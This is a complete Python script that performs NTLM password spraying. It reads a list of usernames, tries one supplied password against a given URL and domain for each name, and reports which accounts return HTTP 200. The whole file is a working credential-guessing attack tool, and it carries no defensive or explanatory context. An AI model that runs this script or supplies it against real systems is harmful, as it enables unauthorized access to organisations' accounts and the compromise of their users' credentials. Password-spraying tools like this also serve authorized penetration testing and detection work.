import requests
import argparse
from requests_ntlm import HttpNtlmAuth


parser = argparse.ArgumentParser()
parser.add_argument('--usernames', type=str, required=True, help='Text file')
parser.add_argument('--password', type=str, required=True)
parser.add_argument('--url', type=str, required=True)
parser.add_argument('--domain', type=str, required=True)

args = parser.parse_args()
with open(f"{args.usernames}") as f:
    for username in f:
        req= requests.get(args.url,auth=HttpNtlmAuth(args.domain + '\\' + username[:-1],args.password))
        if req.status_code == 200:
            print("[+] Founded: " + username)
        else:
            print("[-] Failed: " + username)